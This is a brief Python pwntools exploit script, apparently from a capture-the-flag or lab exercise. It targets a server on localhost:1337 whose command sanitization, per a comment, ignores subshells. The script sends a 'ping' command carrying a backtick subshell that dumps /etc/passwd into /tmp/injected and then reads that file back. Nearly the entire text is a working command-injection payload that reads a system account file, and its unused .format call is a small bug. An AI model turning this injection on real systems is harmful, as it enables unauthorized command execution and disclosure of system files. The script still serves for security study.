# "Sanitization" for commands doesn't take into account subshells
# server.cpp:701
from pwn import *
context(arch = 'amd64', os = 'linux')

r = remote('localhost', 1337)
r.recv(4096)


command = "cat /etc/passwd"

# Exfiltration requires storing the output into a temp file
payload = 'ping `cat /etc/passwd > /tmp/injected`'.format(command)
print(payload)

r.sendline(payload)
r.close()

import time
time.sleep(0.5)

# This could just as easily be done with a `get` command
with open("/tmp/injected", "r") as f:
    print(f.read())